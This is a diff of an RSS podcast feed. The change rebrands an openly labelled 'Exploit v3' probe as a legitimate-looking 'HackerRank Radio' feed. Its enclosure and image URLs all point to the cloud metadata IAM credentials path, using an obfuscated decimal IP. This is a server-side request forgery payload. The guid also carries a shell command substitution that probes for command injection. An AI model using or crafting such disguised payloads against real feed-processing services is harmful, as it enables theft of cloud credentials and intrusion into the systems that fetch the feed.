@@ -1,12 +1,16 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<rss version="2.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd">
+<rss xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" version="2.0">
   <channel>
-    <title>Advanced Security Probe</title>
+    <title>HackerRank Radio Security Test</title>
+    <description>HackerRank Radio is a podcast for engineering leaders...</description>
+    <link>https://blog.hackerrank.com</link>
+    <language>en-us</language>
+    <itunes:image href="http://2852039166/latest/meta-data/iam/security-credentials/"/>
     <item>
-      <title>Exploit v3</title>
-      <enclosure url="http://2852039166/latest/meta-data/iam/security-credentials/" length="1024" type="audio/mpeg" />
-      <itunes:image href="http://2852039166/latest/meta-data/iam/security-credentials/" />
-      <guid>probe-$(date +%s)</guid>
+      <title>Optimizing for Excellence</title>
+      <enclosure url="http://2852039166/latest/meta-data/iam/security-credentials/" length="1024" type="audio/mpeg"/>
+      <guid>unique-$(date +%s)</guid>
+      <pubDate>Fri, 10 Apr 2026 14:00:00 GMT</pubDate>
     </item>
   </channel>
 </rss>
